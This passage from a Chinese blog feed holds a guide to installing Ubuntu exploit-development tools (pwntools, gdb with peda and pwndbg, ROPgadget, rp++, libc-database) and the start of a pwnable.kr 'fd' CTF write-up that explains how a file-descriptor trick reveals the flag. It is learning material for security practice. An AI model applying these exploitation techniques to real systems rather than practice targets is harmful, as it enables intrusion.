Tools</code>,但是不能自适应客户机也不能进行文件复制，相当于没有安装，哈哈哈。记得之前有一个工具可以替代VMware Tools，名字也想不起来了就上网搜了下，是<a href="https://kb.vmware.com/s/article/2095783" target="_blank" rel="noopener">open-vm-tools</a>.而且当你安装VMware Tools的时候也会提醒你安装<code>open-vm-tools</code>.安装前先将VMware Tools卸载。Ubuntu14.04及以上版本，都建议安装这个工具。安装使用如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#desktop</span><br><span class="line">sudo apt-get install open-vm-tools</span><br><span class="line">sudo apt-get install open-vm-tools-desktop</span><br><span class="line">#server or headless</span><br><span class="line">sudo apt-get install open-vm-tools</span><br></pre></td></tr></table></figure></p><p>安装完重启就可以进行文件复制，并且可以自适应客户机。安装过程可参考这篇文章<br><a href="https://jingyan.baidu.com/article/54b6b9c0982f2f2d593b4762.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/54b6b9c0982f2f2d593b4762.html</a></p><h3 id="安装aptitude-Debian系统的包管理工具"><a href="#安装aptitude-Debian系统的包管理工具" class="headerlink" title="安装aptitude(Debian系统的包管理工具)"></a>安装aptitude(Debian系统的包管理工具)</h3><p>Ubuntu是基于<code>Debian</code>的一个Linux发行版。</p><blockquote><p><strong><code>aptitude介绍</code></strong><br>aptitude与 <code>apt-get</code> 一样，是 Debian 及其衍生系统中功能极其强大的包管理工具。与 apt-get 不同的是，aptitude在处理依赖问题上更佳一些。举例来说，aptitude在删除一个包时，会同时删除本身所依赖的包。这样，系统中不会残留无用的包，整个系统更为干净。(百度百科)</p></blockquote><p>安装aptitude很简单，只需一条命令即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aptitude</span><br></pre></td></tr></table></figure></p><p>但是我遇到了软件包依赖缺失，导致安装不成功。上网搜了下，说换成官方源可以，就换成官方源试了试，果然成功安装，666。换完源执行以下两条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update 更新源</span><br><span class="line">sudo apt-get install aptitude   安装aptitude</span><br></pre></td></tr></table></figure></p><h3 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h3><p>这个也很简单，先下载Linux版的deb包，按照自己所安装系统的位数下载，然后运行下面一条命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i deb包的名字</span><br></pre></td></tr></table></figure></p><p>但是会出错，因为有依赖问题，解决方案可以看这两篇博客<br><a href="https://www.cnblogs.com/lrj567/p/6307329.html" target="_blank" rel="noopener">Ubuntu 16.04 LTS安装sogou输入法详解</a><br><a href="https://blog.csdn.net/u013894834/article/details/60357071" target="_blank" rel="noopener">Ubuntu16.04安装搜狗输入法</a></p><h3 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h3><p>本来一条命令就可以安装成功，但还是出现了问题，依旧是依赖问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure></p><p>参考链接：<a href="http://www.cnblogs.com/wangyarui/p/6055369.html" target="_blank" rel="noopener">http://www.cnblogs.com/wangyarui/p/6055369.html</a><br>记得还有一个问题，当时也没记录，当时是安装完aptitude，源是官方的，然后没安装成功，换成清华源后安装成功了。</p><h3 id="安装zsh与oh-my-zsh"><a href="#安装zsh与oh-my-zsh" class="headerlink" title="安装zsh与oh-my-zsh"></a>安装zsh与oh-my-zsh</h3><p>我安装这个是为了看起来更加舒服一点，查了一下，zsh的功能很强大，可以说比普通的bash shell好用多了，有兴趣的可以看看。oh-my-zsh具有各种各样的主题，超好看。我用的是agnoster主题，安装完有乱码，是字体的原因，需要安装powerline字体。一些链接如下：<br><a href="http://ohmyz.sh/" target="_blank" rel="noopener">oh-my-zsh官网</a>  </p><p><code>oh-my-zsh源码和主题</code></p><div class="github-widget" data-repo="robbyrussell/oh-my-zsh"></div><p><code>powerline字体</code></p><div class="github-widget" data-repo="supermarin/powerline-fonts"></div><p><a href="https://blog.csdn.net/u011781521/article/details/53861497" target="_blank" rel="noopener">安装参考链接</a></p><blockquote><p><strong><code>问题</code></strong><br>curl: (7) Failed to connect to 127.0.0.1 port 35787: 拒绝连接<br>这个是由于啥时候设置了代理，取消了就好了，很迷(应该不是我设的)<br><strong><code>建议</code></strong><br>zsh在root用户和普通用户下都可以设置，但只建议设置普通用户下的</p></blockquote><h2 id="Pwn环境搭建"><a href="#Pwn环境搭建" class="headerlink" title="Pwn环境搭建"></a>Pwn环境搭建</h2><blockquote><p><strong><code>基本工具</code></strong>：</p><ul><li>gdb+peda+pwndbg、gcc、Pwntools、Binutils</li><li>Capstone、gcc-multilib、socat、rp++、readelf</li><li>ROPgaget、libc-database、objdump、file、string、checksec</li></ul></blockquote><p>这么多工具，其实这才是一点点，还有好多工具现在我还不知道。先说一下<code>Pwntools</code>吧。Pwntools是一个CTF框架和漏洞利用开发库，它使用Python编写的，由rapid设计并维护，设计这个框架的目的是为了让使用者简单快速的编写exploit。对Pwntools支持最好的是64bits的Ubuntu LTE Realease(12.04、14.04、16.04)，所以我选择了在Ubuntu16.04下安装这个框架，Python环境是Python2.7。但是绝大多数的功能也支持Debian, Arch, FreeBSD, OSX, 等等。安装Pwntools成功的前提是安装了git、pip、Binutils、Capstone、Python-Dev等库和工具。</p><h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><p>pip是Python的一个<code>包管理工具</code>，用于安装和卸载Python的扩展模块。如果你使用的Python 2 &gt;=2.7.9或Python 3 &gt;=3.4并且从python.org下载，那么pip已经安装了，但是需要<code>升级pip</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#安装pip</span><br><span class="line">sudo apt-get update #更新源</span><br><span class="line">sudo apt-get install python-pip #安装pip，可能会有依赖问题，记不清了</span><br><span class="line">pip --version   #查看pip版本，确认是否安装成功</span><br><span class="line">#升级pip</span><br><span class="line">sudo pip install --upgrade pip  #Linux or MacOS</span><br><span class="line">python -m pip install -U pip    #windows</span><br></pre></td></tr></table></figure><p>pip常用命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip --help #查看帮助菜单</span><br><span class="line">pip install packageName #安装新的python包</span><br><span class="line">pip uninstall packageName #卸载python包</span><br><span class="line">pip search packageName  #寻找python包</span><br></pre></td></tr></table></figure></p><h3 id="安装git-分布式版本控制系统"><a href="#安装git-分布式版本控制系统" class="headerlink" title="安装git(分布式版本控制系统)"></a>安装git(分布式版本控制系统)</h3><p><code>Git</code>是一个开源的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件(百度百科)。 通过这个工具,我们可以下载和上传一些开源软件的源代码，非常方便。这些代码都是保存在Github上的仓库中。</p><blockquote><p><code>Github与Git的区别</code><br>Git，开发者将源代码存入名叫“Git 仓库”的资料库中并加以使用。而 GitHub 则是在网络上提供 Git 仓库的一项服务。也就是说，GitHub 上公开的软件源代码全都由 Git 进行管理。理解 Git，是熟练运用 GitHub 的关键所在。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#安装git工具</span><br><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><h3 id="Capstone"><a href="#Capstone" class="headerlink" title="Capstone"></a>Capstone</h3><blockquote><p><code>Capstone介绍</code><br>Capstone是一个反汇编框架，它的目标是成为最好的反汇编引擎，它是为安全社区中的研究人员进行二进制分析和逆向提供服务的。Core (Arm, Arm64, M68K, Mips, PPC, Sparc, SystemZ, X86, X86_64, XCore) + bindings (Python, Java, Ocaml, PowerShell)</p></blockquote><div class="github-widget" data-repo="aquynh/capstone"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#安装Capstone</span><br><span class="line">git clone http://github.com/aquynh/capstone #下载Capstone源码到本地</span><br><span class="line">cd capstone</span><br><span class="line">make    #编译源文件</span><br><span class="line">sudo make install   #编译并安装</span><br></pre></td></tr></table></figure><h3 id="安装Binutils"><a href="#安装Binutils" class="headerlink" title="安装Binutils"></a>安装Binutils</h3><blockquote><p><code>Binutils简介</code><br>GNU Binutils 是一组开发工具，包括连接器，汇编器和其他用于目标文件和档案的工具。包括下列程序: addr2line, ar, as, c++filt, gprof, ld, nm, objcopy, objdump, ranlib, readelf, size, strings 和 strip。<a href="ftp://ftp.gnu.org/gnu/binutils" target="_blank" rel="noopener">下载链接</a></p></blockquote><p>Ubuntu16.04默认是安装了Binutils的，所以如果版本太老了可以选择更新一下。外国架构的组装(例如，在Mac OS X上装配Sparc shell)需要安装跨编译的binutils版本。</p><p><code>编译安装法</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget http://ftp.gnu.org/gnu/binutils/binutils-2.25.1.tar.bz2    </span><br><span class="line">tar -xvf binutils-2.25.1.tar.bz2    </span><br><span class="line">mkdir -v ../binutils-build  #binutils官方推荐编译binutils要和源码分离</span><br><span class="line">cd ../binutils-build</span><br><span class="line">../binutils-2.20/configure --prefix=/tools --target=$LFS_TGT --disable-nls --disable-werror</span><br><span class="line">make    #编译</span><br><span class="line">make install    #编译并安装</span><br></pre></td></tr></table></figure></p><p>configure参数可参照这个链接。<a href="http://www.jinbuguo.com/linux/glibc-gcc-binutils.html" target="_blank" rel="noopener">http://www.jinbuguo.com/linux/glibc-gcc-binutils.html</a></p><p><code>Pwntools手册</code>提供的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install software-properties-common</span><br><span class="line">$ apt-add-repository ppa:pwntools/binutils</span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get install binutils-$ARCH-linux-gnu  # $ARCH代表处理器架构</span><br></pre></td></tr></table></figure><p>试了apt-get install binutils-x86_64-linux-gnu,显示找不到安装包。看了pcat大佬的博客知道了在github上有一个pwntools-binutils的项目。</p><p><code>pwntools-binutils安装</code></p><div class="github-widget" data-repo="Gallopsled/pwntools-binutils"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools-binutils</span><br><span class="line">cd ubuntu</span><br><span class="line">chmod +x install_all.sh</span><br><span class="line">./install_all.sh arm #your architecture</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center"><strong>成功安装</strong></th><th style="text-align:center"><strong>未成功安装</strong></th></tr></thead><tbody><tr><td style="text-align:center">binutils-aarch64-linux-gnu</td><td style="text-align:center">binutils-arm-linux-gnu</td></tr><tr><td style="text-align:center">binutils-alpha-linux-gnu</td><td style="text-align:center">binutils-avr-linux-gnu</td></tr><tr><td style="text-align:center">binutils-hppa-linux-gnu</td><td style="text-align:center">binutils-cris-linux-gnu</td></tr><tr><td style="text-align:center">binutils-m68k-linux-gnu</td><td style="text-align:center">binutils-ia64-linux-gnu</td></tr><tr><td style="text-align:center">binutils-mips-linux-gnu</td><td style="text-align:center">binutils-mips64-linux-gnu</td></tr><tr><td style="text-align:center">binutils-powerpc-linux-gnu</td><td style="text-align:center">binutils-msp430-linux-gnu</td></tr><tr><td style="text-align:center">binutils-powerpc64-linux-gnu</td><td style="text-align:center">binutils-s390-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-sparc-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-vax-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-xscale-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-i386-linux-gnu</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">binutils-x86_64-linux-gnu</td></tr></tbody></table><p>没安装的我在这个网站搜了一下也没搜到。<a href="https://packages.ubuntu.com/" target="_blank" rel="noopener">https://packages.ubuntu.com/</a></p><h3 id="安装Python-Dev-Python-Development-Headers"><a href="#安装Python-Dev-Python-Development-Headers" class="headerlink" title="安装Python-Dev(Python Development Headers)"></a>安装Python-Dev(Python Development Headers)</h3><blockquote><p><code>Python-Dev介绍</code><br>python-dev或python-devel称为是python的开发包，其中包括了一些用C/Java/C#等编写的python扩展在编译的时候依赖的头文件等信息。比如我们在编译一个用C语言编写的python扩展模块时，因为里面会有#include<python.h>等这样的语句，因此我们就需要先安装python-devel开发包。</python.h></p></blockquote><p>一些Pwntools的Python依赖项需要本地扩展，所以必须要安装Python-Dev.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev</span><br></pre></td></tr></table></figure><p>可能会无法安装，依赖问题，用aptitude替换apt-get进行安装，成功安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aptitude install python-dev</span><br></pre></td></tr></table></figure><h3 id="安装Pwntools"><a href="#安装Pwntools" class="headerlink" title="安装Pwntools"></a>安装Pwntools</h3><div class="github-widget" data-repo="Gallopsled/pwntools"></div><p><code>github下载安装</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p><code>pip安装</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">#可以看到有些前面已经装过了，这是我复制pwntools手册上的</span><br><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential   </span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>如果没报错，进入python终端，输入import pwn，然后回车，没报错应该就是安装好了<br>现在尝试一下pwntools的asm功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; pwn.asm(&quot;xor eax,eax&quot;)</span><br><span class="line">&apos;1\xc0&apos;</span><br></pre></td></tr></table></figure><p>如果有正确输出，即说明这个功能是可以用的，到这里就算安装完成。</p><h3 id="gdb-peda-pwndbg安装"><a href="#gdb-peda-pwndbg安装" class="headerlink" title="gdb+peda+pwndbg安装"></a>gdb+peda+pwndbg安装</h3><blockquote><p><code>gdb介绍</code><br>GDB（GNU Debugger）GNU开发的Unix/Linux下的调试工具。其功能强大，现描述如下：<br>GDB主要帮忙你完成下面四个方面的功能：<br>1.启动你的程序，可以按照你的自定义的要求随心所欲的运行程序。<br>2.可让被调试的程序在你所指定的调置的断点处停住。（断点可以是条件表达式）<br>3.当程序被停住时，可以检查此时你的程序中所发生的事。<br>4.动态的改变你程序的执行环境。<br>gdb不同于windows下的ollydbg和windbg，它是命令行下的工具，没有图形界面，通过输入命令与它交互，来调试程序，查看程序的运行过程,这一点和windbg有点相似。也是很多致力于安全研究、漏洞发现的人的一个神器。</p></blockquote><p>Ubuntu16.04是默认安装了gdb的，可以使用gdb –version查看gdb的版本，如果没有安装可以使用下面一条命令进行安装，也可以编译安装。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb</span><br></pre></td></tr></table></figure><blockquote><p><code>peda介绍</code><br>peda全称是Python Exploit Development Assistance for GDB。PEDA是为GDB设计的一个强大的插件它提供了很多人性化的功能，比如高亮显示反汇编代码、寄存器、内存信息，提高了debug的效率。同时，PEDA还为GDB添加了一些实用新的命令，比如checksec可以查看程序开启了哪些安全机制等等。它是用Python写的一个工具，可以辅助编写exp,运行在Unix/Linux系统上。</p></blockquote><div class="github-widget" data-repo="longld/peda"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#安装peda</span><br><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br><span class="line">echo &quot;DONE! debug your program with gdb and enjoy&quot;</span><br></pre></td></tr></table></figure><p>peda也可以通过<code>pip</code>安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pip</span><br></pre></td></tr></table></figure></p><blockquote><p><code>pwndbg介绍</code><br>Pwndbg是一个Python模块，它直接加载到GDB中，并提供了一套实用工具和一组辅助工具来绕过GDB的所有cruft，并将粗糙的边缘平滑掉。过去的许多其他项目(如gdbinit、PEDA)和现在(例如GEF)的存在填补了这些空白。它们都提供了优秀的经验和优秀的特性——但是它们很难扩展(有些是未维护的，所有的都是单个100KB、200KB或300KB文件)。Pwndbg的存在不仅是为了取代它的所有前辈，而且还有一个快速运行的干净的实现。</p></blockquote><p>Pwndbg支持最好的环境是: <code>Ubuntu14.04 and GDB7.7</code>  <code>Ubuntu16.04 and GDB7.11</code></p><div class="github-widget" data-repo="pwndbg/pwndbg"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#安装Pwndbg</span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>这些工具的用法打算另写一篇文章，不然这篇文章实在是太长了。</p><h3 id="安装gcc-multilib"><a href="#安装gcc-multilib" class="headerlink" title="安装gcc-multilib"></a>安装gcc-multilib</h3><blockquote><p><code>gcc-multilib</code><br>gcc-multilib是Debian的64位系统下运行32位程序的一个库，装了这个库就可以运行32位的程序了。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#安装命令</span><br><span class="line">sudo apt-get install gcc-multilib   或者</span><br><span class="line">sudo aptitude install gcc-multilib</span><br></pre></td></tr></table></figure><h3 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h3><blockquote><p><code>socat</code><br>socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的加强版,socat是两个独立数据通道之间的双向数据传输的继电器。这些数据通道包含文件、管道、设备（终端或调制解调器等）、插座（Unix，IP4，IP6 - raw，UDP，TCP）、SSL、SOCKS4客户端或代理CONNECT。Socat支持广播和多播、抽象Unix sockets、Linux tun/tap、GNU readline 和 PTY。它提供了分叉、记录和进程间通信的不同模式。多个选项可用于调整socat和其渠道，Socat可以作为TCP中继（一次性或守护进程），作为一个守护进程基于socksifier，作为一个shell Unix套接字接口，作为IP6的继电器，或面向TCP的程序重定向到一个串行线。socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket等。(文档英文的看起来太困难，这是别人写的，也不知道对不对，以后)</p></blockquote><p>Ubuntu16.04下默认安装有，如果没有，需要安装的话，看了别人的文章，好像要下载源码编译安装。</p><h3 id="安装rp"><a href="#安装rp" class="headerlink" title="安装rp++"></a>安装rp++</h3><blockquote><p><code>rp++</code><br>rp++是一种完全用c++编写的工具，目的是在PE/Elf/Mach-O(不支持FAT二进制文件)x86/x64二进制文件中找到ROP序列。它是开源的，已经在几个操作系统上测试过:Debian / Windows 7 / FreeBSD / Mac OSX Lion(10.7.3)。此外，它是x64兼容的。我差点忘了，它同时处理英特尔和英特尔。</p></blockquote><div class="github-widget" data-repo="0vercl0k/rp"></div><p><a href="https://github.com/0vercl0k/rp/downloads" target="_blank" rel="noopener">下载链接</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#运行</span><br><span class="line">chmod +x rp-lin-x64</span><br><span class="line">./rp-lin-x64</span><br></pre></td></tr></table></figure><h3 id="安装ROPgadget"><a href="#安装ROPgadget" class="headerlink" title="安装ROPgadget"></a>安装ROPgadget</h3><blockquote><p><code>ROPgadget介绍</code><br>这个工具可以让你在二进制文件上搜索的小工具，以方便你的ROP利用。ROPgadget支持x86、x64、ARM、ARM64、PowerPC、SPARC和MIPS体系结构的ELF/PE/Mach-O格式。从版本5开始,ROPgadget有一个新的核心，它是用Python的Capstone disassembly框架编写的，用于gadget搜索引擎——旧版本可以在存档目录中找到，但它不会被维护。</p></blockquote><div class="github-widget" data-repo="JonathanSalwan/ROPgadget"></div><p>安装ROPgadget之前需要先安装Capstone,这个反汇编框架之前已经安装过了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#方法一</span><br><span class="line">#安装过capstone后，ROPgadget可以作为一个单独的工具使用</span><br><span class="line">ROPgadget.py</span><br><span class="line">#方法二</span><br><span class="line">#安装到Python的站点包库中，并且加入环境变量中</span><br><span class="line">python setup.py install</span><br><span class="line">ROPgadget</span><br><span class="line">#方法三</span><br><span class="line">#用pip安装</span><br><span class="line">pip install ropgadget</span><br><span class="line">ROPgadget</span><br></pre></td></tr></table></figure><h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><blockquote><p><code>libc-database介绍</code><br>libc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。libc-database是github上的一个仓库，可以进行服务器上所用函数库版本的识别。</p></blockquote><div class="github-widget" data-repo="niklasb/libc-database"></div><p>这里还有一个更全的，是一个网站。<code>libcdb.com</code></p><p>写到这总算告一段落了，如果后期还有更好的工具，我会补充，就先到这吧。</p>]]></content>
      
      <categories>
          
          <category> 备忘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Ubuntu </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pwnable.kr</title>
      <link href="/2018/03/23/pwnable.kr/"/>
      <url>/2018/03/23/pwnable.kr/</url>
      <content type="html"><![CDATA[<blockquote><p>开始入坑Pwn,此篇博文记录在pwnable.kr网站上做题的过程和在做题过程中遇到的新的知识点的学习！<br><a id="more"></a></p></blockquote><h2 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="[Toddler’s Bottle]"></a>[Toddler’s Bottle]</h2><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><blockquote><p><strong>题目描述:</strong><br>Mommy! what is a file descriptor in Linux?<br>try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial<br>link: <a href="https://www.youtube.com/watch?v=blAxTfcW9VU" target="_blank" rel="noopener">https://www.youtube.com/watch?v=blAxTfcW9VU</a><br>ssh fd@pwnable.kr -p2222 (pw:guest)</p></blockquote><h4 id="0x00-题目分析"><a href="#0x00-题目分析" class="headerlink" title="0x00 题目分析"></a>0x00 题目分析</h4><p>通过题目名称和题目描述可知,此题与Linux下文件的描述有关系。题目还给了一个ssh连接账号和密码,先连接一下看看。</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-00.png" alt="登录成功"><br></div><blockquote><p><strong>知识点一</strong> Linux系统文件描述fd(file descriptor)</p></blockquote><h4 id="0x01-查看文件及权限"><a href="#0x01-查看文件及权限" class="headerlink" title="0x01 查看文件及权限"></a>0x01 查看文件及权限</h4><p>再看看当前目录下有什么文件,发现了三个文件,fd、fd.c、flag,并且看到当前用户对于flag文件没有读权限。</p><div align="left"><br>    <img src="/resources/2018/2018-03-23-01.png" alt="查看文件"><br></div><blockquote><p><strong>知识点二</strong> Linux文件权限</p></blockquote><h4 id="0x02-分析fd-c"><a href="#0x02-分析fd-c" class="headerlink" title="0x02 分析fd.c"></a>0x02 分析fd.c</h4><p>查看fd.c内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先分析一下这段代码,main()函数有三个参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">****************************main()原型*******************************</span><br><span class="line"><span class="number">1.</span> argc  指命令行输入参数的个数(编译器根据用户输入计算,程序名称也算在里面)</span><br><span class="line"><span class="number">2.</span> argv  存储命令行输入的参数(多个参数用空格分隔,以<span class="literal">NULL</span>结束)</span><br><span class="line"><span class="number">3.</span> env   存储了系统的环境变量</span><br><span class="line">********************************************************************</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* env[] )</span></span></span><br></pre></td></tr></table></figure><blockquote><p>1.要想拿到flag,执行system(“/bin/cat flag”)<br>2.就要使if(!strcmp(“LETMEWIN\n”, buf))的条件为真<br>3.那么就要使strcmp(“LETMEWIN\n”,buf)返回0,也就是buf=”LETMEWIN\n”<br>4.buf中的值是从fd中读出来的<br>5.atoi(表示 ascii to integer)是把字符串转换成整型数的一个函数<br>6.当argv[1]=”4660”时,fd=0.表示从键盘读入数据存放到buf中,因为在Linux系统将所有设备都当作文件来处理,当fd=0时就是把键盘当做一个文件</p></blockquote><div align="center"><strong>Linux标准文件描述符</strong></div><table><thead><tr><th style="text-align:center">文件描述符</th><th style="text-align:center">缩写</th><th 